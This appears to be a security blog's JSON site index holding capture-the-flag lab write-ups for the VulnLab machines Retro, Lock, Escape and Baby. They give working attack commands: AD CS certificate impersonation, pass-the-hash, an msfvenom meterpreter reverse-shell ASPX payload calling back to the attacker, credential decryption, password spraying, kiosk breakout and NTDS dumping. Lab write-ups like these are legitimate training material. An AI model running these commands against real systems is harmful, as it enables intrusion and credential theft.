
[{"content":"","date":"13 February 2026","externalUrl":null,"permalink":"/tags/active-directory/","section":"Tags","summary":"","title":"Active Directory","type":"tags"},{"content":"","date":"13 February 2026","externalUrl":null,"permalink":"/tags/adcs/","section":"Tags","summary":"","title":"ADCS","type":"tags"},{"content":"","date":"13 February 2026","externalUrl":null,"permalink":"/","section":"Anxo Januario","summary":"","title":"Anxo Januario","type":"page"},{"content":"","date":"13 February 2026","externalUrl":null,"permalink":"/tags/certipy/","section":"Tags","summary":"","title":"Certipy","type":"tags"},{"content":"","date":"13 February 2026","externalUrl":null,"permalink":"/difficulties/","section":"Difficulties","summary":"","title":"Difficulties","type":"difficulties"},{"content":"","date":"13 February 2026","externalUrl":null,"permalink":"/difficulties/easy/","section":"Difficulties","summary":"","title":"Easy","type":"difficulties"},{"content":"","date":"13 February 2026","externalUrl":null,"permalink":"/tags/esc2/esc3/","section":"Tags","summary":"","title":"ESC2/ESC3","type":"tags"},{"content":"","date":"13 February 2026","externalUrl":null,"permalink":"/tags/guest-access/","section":"Tags","summary":"","title":"Guest Access","type":"tags"},{"content":"","date":"13 February 2026","externalUrl":null,"permalink":"/writeup/machines/","section":"WriteUps","summary":"","title":"Machines","type":"writeup"},{"content":" Nmap # We began the engagement by performing a full TCP port scan against the target:\nsudo nmap -p- -sCV 10.10.87.108 -oA nmap/10.10.87.108-full-tcp Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-13 15:36 CET Stats: 0:26:35 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 95.85% done; ETC: 16:04 (0:01:09 remaining) Nmap scan report for 10.10.87.108 Host is up (0.050s latency). Not shown: 65514 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC.retro.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:DC.retro.vl | Not valid before: 2026-02-13T14:24:43 |_Not valid after: 2027-02-13T14:24:43 |_ssl-date: TLS randomness does not represent time 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC.retro.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:DC.retro.vl | Not valid before: 2026-02-13T14:24:43 |_Not valid after: 2027-02-13T14:24:43 |_ssl-date: TLS randomness does not represent time 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=DC.retro.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:DC.retro.vl | Not valid before: 2026-02-13T14:24:43 |_Not valid after: 2027-02-13T14:24:43 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC.retro.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:DC.retro.vl | Not valid before: 2026-02-13T14:24:43 |_Not valid after: 2027-02-13T14:24:43 |_ssl-date: TLS randomness does not represent time 3389/tcp open ms-wbt-server Microsoft Terminal Services |_ssl-date: 2026-02-13T15:06:49+00:00; -1s from scanner time. | ssl-cert: Subject: commonName=DC.retro.vl | Not valid before: 2026-02-12T14:33:32 |_Not valid after: 2026-08-14T14:33:32 | rdp-ntlm-info: | Target_Name: RETRO | NetBIOS_Domain_Name: RETRO | NetBIOS_Computer_Name: DC | DNS_Domain_Name: retro.vl | DNS_Computer_Name: DC.retro.vl | Product_Version: 10.0.20348 |_ System_Time: 2026-02-13T15:06:09+00:00 9389/tcp open mc-nmf .NET Message Framing 49664/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49672/tcp open msrpc Microsoft Windows RPC 49674/tcp open msrpc Microsoft Windows RPC 49680/tcp open msrpc Microsoft Windows RPC 49701/tcp open msrpc Microsoft Windows RPC 49704/tcp open msrpc Microsoft Windows RPC 49714/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -1s, deviation: 0s, median: -1s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2026-02-13T15:06:12 |_ start_date: N/A The scan results clearly indicated that the target was a Windows Domain Controller, as evidenced by the presence of LDAP (389), Kerberos-related services (464), SMB (445), and Active Directory Global Catalog ports (3268/3269).\nAdditionally, the SSL certificates revealed the domain name retro.vl and confirmed that the host was DC.retro.vl.\nWith enum4linux we can detect that guest access is enabled\nenum4linux-ng 10.10.87.108 -A SMB # Using the guest account we proceeded with SMB enumeration by listing the available SMB shares:\nnxc smb 10.10.87.108 -d retro.vl -u \u0026#34;guest\u0026#34; -p \u0026#34;\u0026#34; --shares The share named \u0026ldquo;Trainees\u0026rdquo; appeared to be interesting so we accessed it with smbclient and downloaded the file called \u0026ldquo;Important.txt\u0026rdquo;.\nsmbclient //10.10.87.108/Trainees -U RETRO/Guest smb: \\\u0026gt; get Important.txt Weak credentials # The file was a note to the Trainees and mentioned the existence of a user on the domain with weak credentials.\nWith impacket we listed all the domain users:\nimpacket-lookupsid Guest@10.10.87.108 During this process, we identified a user named trainee, which clearly correlated with the note.\nOut of pure intuition, we attempted to use the username as the password, and it turned out to be valid credentials. Using the newly obtained credentials, we listed the shares again:\nnxc smb 10.10.87.108 -d RETRO -u \u0026#34;trainee\u0026#34; -p \u0026#34;trainee\u0026#34; --shares A new share named Notes became accessible. We connected to it and downloaded a file named ToDo.txt:\nsmbclient //10.10.87.108/Notes -U RETRO/trainee smb: \\\u0026gt; get ToDo.txt Pre created cumputer accounts abuse # The note revealed the existence of a pre-created computer account associated with the finance department. It also suggested that the account was abandoned.\nWe gathered additional information using LDAP:\nldapsearch -H ldap://10.10.87.108 -x -D \u0026#34;trainee@RETRO.VL\u0026#34; -w \u0026#34;trainee\u0026#34; -b \u0026#34;DC=RETRO,DC=VL\u0026#34; \u0026#34;user\u0026#34; | grep dn We identified a computer account named BANKING$. Since the note suggested that the account had been abandoned, we attempted authentication using a similar pattern as before.\nnxc smb 10.10.87.108 -d RETRO -u \u0026#34;BANKING$\u0026#34; -p \u0026#34;banking\u0026#34; The credentials were valid; however, since the account had not been used for a long time, the machine password was out of sync with the Domain Controller.\nInstead of resetting the password (which would have been more intrusive), we abused the behavior of pre-created computer accounts by requesting a Kerberos TGT using Impacket, as described in the following blog post:\nhttps://trustedsec.com/blog/diving-into-pre-created-computer-accounts impacket-getTGT \u0026#39;retro.vl/BANKING$:banking\u0026#39; -dc-ip 10.10.87.108 export KRB5CCNAME=BANKING$.ccache Note If kerberos tools are not installed on Kali run:\nsudo apt update \u0026amp;\u0026amp; sudo apt install krb5-userWe verified that the ticket was successfully imported using:\nklist This allowed us to authenticate using Kerberos without modifying the account password.\nActive Directory Certificate Services (AD CS) # AD CS Enumeration # After gaining control over the machine account, we enumerated ADCS using Certipy:\ncertipy-ad find -u trainee@10.10.87.108 -p trainee Exploiting AD CS # We proceeded to request a certificate impersonating the Domain Administrator:\ncertipy-ad req -k -ca retro-DC-CA -upn Administrator -template RetroClients -target dc.retro.vl -key-size 4096 The parameters were used as follows:\n-k used Kerberos authentication with the cached TGT. -ca retro-DC-CA specified the Certificate Authority. -upn Administrator targeted the Domain Administrator account. -template RetroClients leveraged the vulnerable template. -target dc.retro.vl specified the CA server. The request succeeded, and we obtained a PFX certificate for the Domain Administrator account.\nAuthentication as Administrator # We authenticated using the obtained certificate:\ncertipy-ad auth -pfx administrator.pfx -username Administrator -domain retro.vl -dc-ip 10.10.87.108 This allowed us to retrieve the NT hash of the Domain Administrator account.\nFoothold as Administrator # Finally, we leveraged the Pass-the-Hash technique using Evil-WinRM:\nevil-winrm -i 10.10.87.108 -u Administrator -H 252fac7066d93dd009d4fd2cd0368389 ","date":"13 February 2026","externalUrl":null,"permalink":"/writeup/machines/vulnlab/retro/","section":"WriteUps","summary":"","title":"Retro","type":"writeup"},{"content":"","date":"13 February 2026","externalUrl":null,"permalink":"/tags/smb-enumeration/","section":"Tags","summary":"","title":"SMB Enumeration","type":"tags"},{"content":"","date":"13 February 2026","externalUrl":null,"permalink":"/sources/","section":"Sources","summary":"","title":"Sources","type":"sources"},{"content":"","date":"13 February 2026","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"13 February 2026","externalUrl":null,"permalink":"/sources/vulnlab/","section":"Sources","summary":"","title":"VulnLab","type":"sources"},{"content":"","date":"13 February 2026","externalUrl":null,"permalink":"/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"","date":"13 February 2026","externalUrl":null,"permalink":"/writeup/","section":"WriteUps","summary":"","title":"WriteUps","type":"writeup"},{"content":"","date":"12 February 2026","externalUrl":null,"permalink":"/tags/aspx/","section":"Tags","summary":"","title":"ASPX","type":"tags"},{"content":"","date":"12 February 2026","externalUrl":null,"permalink":"/tags/cve-2023-49147/","section":"Tags","summary":"","title":"CVE-2023-49147","type":"tags"},{"content":"","date":"12 February 2026","externalUrl":null,"permalink":"/tags/git/","section":"Tags","summary":"","title":"Git","type":"tags"},{"content":" Nmap # First, as always, the challenge was started by running Nmap to enumerate the server\u0026rsquo;s ports and services.\n$ sudo nmap -p- -sCV 10.10.66.156 -oA nmap/fulltcp-Lock Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-11 15:52 CET Nmap scan report for 10.10.66.156 Host is up (0.045s latency). Not shown: 65529 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Lock - Index | http-methods: |_ Potentially risky methods: TRACE 445/tcp open microsoft-ds? 3000/tcp open http Golang net/http server |_http-title: Gitea: Git with a cup of tea | fingerprint-strings: | GenericLines, Help, RTSPRequest: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Cache-Control: max-age=0, private, must-revalidate, no-transform | Content-Type: text/html; charset=utf-8 | Set-Cookie: i_like_gitea=4a1410f7f5912b94; Path=/; HttpOnly; SameSite=Lax | Set-Cookie: _csrf=HXlkPoIVJzHRd1RcAMJcQnNDQ1g6MTc3MDgyMTc2NjAxNzQ5NzMwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax | X-Frame-Options: SAMEORIGIN | Date: Wed, 11 Feb 2026 14:56:06 GMT | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en-US\u0026#34; class=\u0026#34;theme-auto\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Gitea: Git with a cup of tea\u0026lt;/title\u0026gt; | \u0026lt;link rel=\u0026#34;manifest\u0026#34; href=\u0026#34;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Allow: HEAD | Allow: GET | Cache-Control: max-age=0, private, must-revalidate, no-transform | Set-Cookie: i_like_gitea=f54a9de08878967e; Path=/; HttpOnly; SameSite=Lax | Set-Cookie: _csrf=_Grkx2km5IA23N5Hnv7hGe6j55M6MTc3MDgyMTc2NzAxMTA3MDUwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax | X-Frame-Options: SAMEORIGIN | Date: Wed, 11 Feb 2026 14:56:07 GMT |_ Content-Length: 0 3389/tcp open ms-wbt-server Microsoft Terminal Services |_ssl-date: 2026-02-11T14:57:09+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=Lock | Not valid before: 2026-02-10T14:32:46 |_Not valid after: 2026-08-12T14:32:46 | rdp-ntlm-info: | Target_Name: LOCK | NetBIOS_Domain_Name: LOCK | NetBIOS_Computer_Name: LOCK | DNS_Domain_Name: Lock | DNS_Computer_Name: Lock | Product_Version: 10.0.20348 |_ System_Time: 2026-02-11T14:56:28+00:00 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Service Unavailable |_http-server-header: Microsoft-HTTPAPI/2.0 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb2-time: | date: 2026-02-11T14:56:33 |_ start_date: N/A Foothold # An instance of Gitea was identified on port 3000. Within this instance, a repository named dev-scripts, owned by the user ellen.freeman, was discovered.\nThe repository was cloned for further analysis.\ngit clone http://10.10.66.156:3000/ellen.freeman/dev-scripts.git From within the repository directory, git log was executed to review the commit history. git log The repository contained only two commits: the initial commit, which did not contain any useful information, and a second commit that was examined using the following command:\ngit show dcc869b175a47ff2a2b8171cda55cb82dbddff3d The commit contained an earlier version of the script used to enumerate the repositories of a given user (in this case, ellen.freeman). In this older version, an access token was hardcoded within the source code.\nTo verify the validity of the token, the current script was modified as shown in the following screenshot:\nThe modified script was saved and subsequently executed.\npython3 repos.py http://10.10.66.156:3000/ The token was confirmed to be valid, and execution of the script revealed the existence of a private repository named website. Consequently, the repository was cloned for further analysis.\ngit clone http://43ce39bb0[.snip.]67a6362f@10.10.66.156:3000/ellen.freeman/website.git The README file revealed that changes made to the repository were automatically deployed to the organization’s main website.\ncat readme.md As the web server was running on a Windows host, an ASPX payload was generated using msfvenom.\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.8.8.46 LPORT=5555 -f aspx -o reverse.aspx Once the payload was generated, the local repository was configured using the obtained access token, and the updated version was pushed to the remote repository.\ngit remote set-url origin http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.10.66.156:3000/ellen.freeman/website.git git add . git commit -m \u0026#34;1337 update\u0026#34; git push origin main As a result, the payload became accessible through the website and could be executed to obtain a reverse shell. Prior to triggering the payload, a listener was configured in Metasploit to receive the incoming connection.\nuse exploit/multi/handler set LHOST tun0 set LPORT 5555 set payload windows/x64/meterpreter/reverse_tcp run Once the listener was running, the payload was accessed via http://10.10.66.156/anx.aspx, resulting in a Meterpreter session being established on the listener executing as ellen.freeman.\nshell whoami Privilege Escalation # Ellen.freeman to Gale.Dekarios # The following command was executed to identify potentially interesting files within accessible user directories.\npowershell -c \u0026#34;Get-ChildItem -Path \u0026#34;C:\\Users\\*\u0026#34; -Recurse -Include *.zip, *.txt, *.log, *.ps1, *.bat, *.kdbx, *.xml -Exclude \u0026#34;AppData\u0026#34;, \u0026#34;Microsoft\u0026#34;, \u0026#34;OneDrive\u0026#34;, \u0026#34;Contacts\u0026#34;, \u0026#34;Desktop\u0026#34; -ErrorAction SilentlyContinue\u0026#34; A configuration file associated with mRemoteNG was identified, containing credentials for the user Gale.Dekarios.\ncat config.xml A publicly available script exists on GitHub that can decrypt credentials stored in mRemoteNG configuration files:\nhttps://github.com/gquere/mRemoteNG_password_decrypt\nThe configuration file was downloaded from the compromised host using Meterpreter, and the decryption script was then cloned and executed locally to recover the stored credentials:\nmeterpreter \u0026gt; download config.xml git clone https://github.com/gquere/mRemoteNG_password_decrypt.git ./mremoteng_decrypt.py ../config.xml Finally, the recovered credentials were configured in Remmina to establish an RDP connection to the server.\nGale.Dekarios to System (CVE-2023-49147) # Immediately after accessing the system with the Gale.Dekarios account, a PDF24 launcher was observed on the Desktop. A quick Google search revealed that the software is affected by a local privilege escalation vulnerability.\nReference:\nhttps://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/ The installed version of PDF24 was first verified to confirm that it was affected by the documented vulnerability.\nThen, as explained on the referenced blog, is mandatory to locate the MSI file\nAs described in the referenced advisory, it was necessary to locate the associated MSI installer. Once identified, two PowerShell consoles were opened within the corresponding directory to proceed with the exploitation steps.\nThen, the Release.7z archive containing the compiled executables was downloaded from the official repository:\nhttps://github.com/googleprojectzero/symboliclink-testing-tools/releases From this archive, SetOpLock.exe was extracted and uploaded to the target system:\n#Kali python3 -m http.server 80 #Victim wget 10.8.8.46/SetOpLock.exe -O SetOpLock.exe Once all prerequisites were in place, the following SetOpLock.exe command was executed from one of the PowerShell consoles:\n./SetOpLock.exe \u0026#34;C:\\Program Files\\PDF24\\faxPrnInst.log\u0026#34; r This command placed an opportunistic lock (oplock) on the target log file to interfere with the installer’s file operations.\nNext, the following command was executed to initiate the repair process of PDF24 Creator and trigger the vulnerable MSI installer behavior:\nmsiexec.exe /fa C:\\_install\\pdf24-creator-11.15.1-x64.msi After successful exploitation, a cmd.exe instance was opened under elevated privileges. From this window, the Properties menu was accessed by right-clicking on the title bar.\\\nUnder the Options tab, the “Legacy Console Mode” link was selected.\nSince Internet Explorer and Microsoft Edge do not spawn as SYSTEM on Windows 11, an alternative browser was used, Firefox in this case.\nThis action opened a Microsoft help page in a browser running in the context of the elevated process.\nWithin the newly opened browser window, the CTRL + O shortcut was pressed to invoke the file open dialog. The path cmd.exe was entered in the address bar and executed, resulting in a new command prompt running with SYSTEM privileges.\nThis process effectively provided an interactive SYSTEM shell:\n","date":"12 February 2026","externalUrl":null,"permalink":"/writeup/machines/vulnlab/lock/","section":"WriteUps","summary":"","title":"Lock","type":"writeup"},{"content":"","date":"12 February 2026","externalUrl":null,"permalink":"/tags/mremoteng/","section":"Tags","summary":"","title":"MRemoteNG","type":"tags"},{"content":" Nmap # The challenge was started by running Nmap to enumerate the server\u0026rsquo;s ports and services.\nsudo nmap -p- -sCV 10.10.124.49 -oA nmap/fulltcp-Escape Nmap scan report for 10.10.124.49 Host is up (0.049s latency). Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 3389/tcp open ms-wbt-server Microsoft Terminal Services |_ssl-date: 2026-02-10T14:30:09+00:00; -2s from scanner time. | ssl-cert: Subject: commonName=Escape | Not valid before: 2026-02-09T13:56:10 |_Not valid after: 2026-08-11T13:56:10 | rdp-ntlm-info: | Target_Name: ESCAPE | NetBIOS_Domain_Name: ESCAPE | NetBIOS_Computer_Name: ESCAPE | DNS_Domain_Name: Escape | DNS_Computer_Name: Escape | Product_Version: 10.0.19041 |_ System_Time: 2026-02-10T14:30:04+00:00 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -2s, deviation: 0s, median: -2s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1755.60 seconds The scan confirmed that the target was a Windows host with the RDP port open.\nFoothold # Since no user information was available, an attempt was made to access the service by disabling Network Level Authentication (NLA) via the /sec:nla:off parameter.\nNote By default, Windows requires user authentication prior to establishing a connection; however, disabling Network Level Authentication (NLA) allows a user to access the graphical login interface before providing credentials.\nxfreerdp3 /v:10.10.124.49 /u:\u0026#34;\u0026#34; /p:\u0026#34;\u0026#34; /cert:ignore /sec:nla:off Upon accessing the Windows login screen, a message revealed that the host functions as a Conference Display and that a user named \u0026lsquo;KioskUser0\u0026rsquo; can access the system without a password.\nxfreerdp3 /v:10.10.124.49 /u:\u0026#34;KioskUser0\u0026#34; /p:\u0026#34;\u0026#34; /cert:ignore /sec:nla:off +clipboard Escape kiosk mode # Using the KioskUser0 account, access to a Windows desktop operating in Kiosk mode was obtained. The next objective was to attempt a breakout from the restricted environment in order to gain full interactive user access.\nBy pressing the Windows key and typing directly, the search interface was displayed, which allowed msedge.exe (Microsoft Edge) to be launched.\nWith Microsoft Edge open, it was possible to browse the file system by entering C:// in the address bar. This allowed navigation across accessible directories. During this process, a file named profiles.xml, associated with the software Remote Desktop Plus, was identified. The file contained credentials for the admin user.\nThe current user was restricted to accessing files located in the Downloads directory via File Explorer. Therefore, the Remote Desktop Plus executable was downloaded through Microsoft Edge and saved to the Downloads directory.\nAfter attempting to execute the file, the system blocked the execution and displayed the following error message:\n\u0026ldquo;This operation has been cancelled due to system restrictions. Please contact the system administrator.\u0026rdquo;\nTo bypass the restriction, the file was renamed to match the name of an executable that the user was permitted to run, msedge.exe in this scenario.\nThe program provides functionality to import profiles from an XML file. However, to access the file located in the _admin directory, it was necessary to first download it to the Downloads folder, similar to the approach used for the executable file. In this case, the download was performed by opening the file in the browser and pressing Ctrl + S.\nNext, the file was imported on the Remote Desktop Plus program. The profile was selected; however, it was not possible to establish an RDP connection to the host. After further investigation, it was determined that the application temporarily writes encrypted .rdp credential files to the %LOCALAPPDATA%\\Temp directory. These files are created by Remote Desktop Plus during connection attempts and encrypted using the current user’s Data Protection API (DPAPI) context.\nSource: https://github.com/Yeeb1/SharpRDPlusSnatcher First, it was confirmed that the temporary files were generated and that their content contained the encrypted password for the admin user.\nTo obtain a PowerShell console and continue the attack, the PowerShell executable was downloaded to the Downloads folder and renamed to msedge.exe, following the same evasion technique described previously.\nNext, the tool referenced in the aforementioned GitHub repository was downloaded to the attacking machine and subsequently transferred to the target machine using a temporary Python web server and the PowerShell console.\nSource: https://github.com/RedAndBlueEraser/rdp-file-password-encryptor python3 -m http.server 80 wget 10.0.0.46/rdp-file-password-decryptor.ps1 -O rdp-file-password-decryptor.ps1 Then the following command was executed to run a new PowerShell session while temporarily ignoring the execution policy restrictions to run the script and decrypt the hash to obtain the cleartext password for the user admin.\npowershell -ep bypass .\\rdp-file-password-decryptor.ps1 0100....B298 Finally, the runas utility was executed to spawn a new PowerShell console running under the admin user context.\nrunas /user:admin powershell.exe Privilege escalation # To escalate privileges, the following command was simply executed, which starts a new instance of PowerShell requesting elevation via UAC (-Verb runas), thereby displaying a prompt to run the process as an administrator if the user has the appropriate permissions.\nStart-Process powershell.exe -Verb runas ","date":"10 February 2026","externalUrl":null,"permalink":"/writeup/machines/vulnlab/escape/","section":"WriteUps","summary":"","title":"Escape","type":"writeup"},{"content":"","date":"10 February 2026","externalUrl":null,"permalink":"/tags/kiosk-escape/","section":"Tags","summary":"","title":"Kiosk Escape","type":"tags"},{"content":"","date":"10 February 2026","externalUrl":null,"permalink":"/tags/rdp/","section":"Tags","summary":"","title":"RDP","type":"tags"},{"content":"","date":"10 February 2026","externalUrl":null,"permalink":"/tags/uac-bypass/","section":"Tags","summary":"","title":"UAC Bypass","type":"tags"},{"content":" Nmap # First, as always, the challenge was started by running Nmap to enumerate the server\u0026rsquo;s ports and services.\n$ sudo nmap -p- -sCV 10.10.102.159 -oA nmap/init-tcp Nmap scan report for 10.10.102.159 Host is up (0.049s latency). Not shown: 65513 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-02-07 11:25:43Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: BABY | NetBIOS_Domain_Name: BABY | NetBIOS_Computer_Name: BABYDC | DNS_Domain_Name: baby.vl | DNS_Computer_Name: BabyDC.baby.vl | Product_Version: 10.0.20348 |_ System_Time: 2026-02-07T11:26:32+00:00 |_ssl-date: 2026-02-07T11:27:11+00:00; -1s from scanner time. | ssl-cert: Subject: commonName=BabyDC.baby.vl | Not valid before: 2026-02-06T10:45:42 |_Not valid after: 2026-08-08T10:45:42 5357/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 49664/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49674/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49675/tcp open msrpc Microsoft Windows RPC 50737/tcp open msrpc Microsoft Windows RPC 52101/tcp open msrpc Microsoft Windows RPC Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2026-02-07T11:26:36 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1837.64 seconds The scan confirmed that the target was a Windows domain controller named BabyDC.baby.vl, belonging to the baby.vl domain as a Domain Controller. It was found to be exposing the following ports and services:\nLDAP (389, 3268) Kerberos (88) SMB (445) RPC (various ports) WinRM (5985) RDP (3389) Foothold # It was then identified that LDAP enumeration using a null session was possible, and a password was discovered in the description field of the user \u0026ldquo;Teresa Bell\u0026rdquo;.\nldapsearch -x -H ldap://10.10.102.159 -b \u0026#34;CN=Teresa Bell,OU=it,DC=baby,DC=vl\u0026#34; -s base An attempt was made to access the SMB service using the discovered credentials, but it was unsuccessful. The null session was then used again to enumerate and dump all existing users in the baby.vl domain:\nldapsearch -x -H ldap://10.10.102.159 -b \u0026#34;dc=baby,dc=vl\u0026#34; \u0026#34;objectClass=user\u0026#34; | grep sAMAccountName | awk {\u0026#39;print $2\u0026#39;} \u0026gt; usernames.txt To complete the usernames.txt dictionary, two additional users were enumerated using the following query:\nCaroline Robinson Ian Walker $ ldapsearch -x -H ldap://10.10.102.159 -b \u0026#34;dc=baby,dc=vl\u0026#34; \u0026#34;user\u0026#34; | grep dn Once the dictionary was completed, a password spraying attack was executed using the obtained password.\nnxc smb 10.10.102.159 -d BABY -u usernames.txt -p \u0026lt;password\u0026gt; Valid credentials for the user \u0026ldquo;Caroline.Robinson\u0026rdquo; were found, but it was necessary to reset her password with the following command:\nsmbpasswd -r 10.10.102.159 -U Caroline.Robinson Old SMB password: New SMB password: Retype new SMB password: Password changed for user Caroline.Robinson After resetting the password, it was possible to enumerate the SMB shares and access with WinRM.\nnxc smb 10.10.102.159 -d BABY -u Caroline.Robinson -p \u0026lt;password\u0026gt; --shares evil-winrm -i 10.10.102.159 -u Caroline.Robinson -p \u0026lt;password\u0026gt; Privilege escalation (failed attempt) # First, the current user\u0026rsquo;s privileges were enumerated, revealing a clear privilege escalation path. The abuse steps used were the ones described in the following blog post:\nhttps://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960 A temporary directory was created. mkdir C:\\temp The SAM and SYSTEM hives from HKLM were copied to C:\\temp: reg save hklm\\sam C:\\temp\\sam.hive reg save hklm\\system C:\\temp\\system.hive Both files were downloaded to the attacking machine: download C:\\temp\\sam.hive download C:\\temp\\system.hive Once the files were on the attacker machine, \u0026ldquo;impacket-secretsdump\u0026rdquo; was executed to extract the hash of the local administrator.\nimpacket-secretsdump -sam sam.hive -system system.hive LOCAL It was not possible to authenticate using this hash, as it corresponds to the local Administrator account, which is not available on a Domain Controller. Therefore, it was necessary to dump the NTDS database as well in order to retrieve the domain hashes Privilege Escalation (successful attempt) # First, as stated in the aforementioned blog post, a DiskShadow script was written to create a live copy of the C: drive and expose it as a network drive using the letter E:. This step is not mentioned in the blog, but during the execution of this exercise several encoding issues were encountered with the script file. These issues were resolved using the following commands:\nGet-Content C:\\temp\\back_script.txt | Set-Content C:\\temp\\back_script_ascii.txt -Encoding ASCII Once the file was uploaded and properly encoded, it was executed as follows:\ndiskshadow /s back_script.txt After the script finished, the E: drive was accessed to verify that it had been correctly cloned: Everything was as expected, so the NTDS.dit file was copied using Robocopy to the Temp directory created on the C: drive and then downloaded to the attacking machine. download ntds.dit Next, using the SYSTEM registry hive that was downloaded during the initial attempt, the NTDS file was decrypted with the following command:\nimpacket-secretsdump -ntds ntds.dit -system system.hive -hashes lmhash:nthash LOCAL And finally, the host was accessed with administrator privileges using the obtained hash:\nevil-winrm -i 10.10.102.159 -u Administrator -H \u0026lt;administrator-hash\u0026gt; ","date":"8 February 2026","externalUrl":null,"permalink":"/writeup/machines/vulnlab/baby/","section":"WriteUps","summary":"","title":"Baby","type":"writeup"},{"content":"","date":"8 February 2026","externalUrl":null,"permalink":"/tags/backup-operator/","section":"Tags","summary":"","title":"Backup Operator","type":"tags"},{"content":" ","date":"8 February 2026","externalUrl":null,"permalink":"/me/certifications/","section":"Me","summary":"","title":"Certifications","type":"me"},{"content":"","date":"8 February 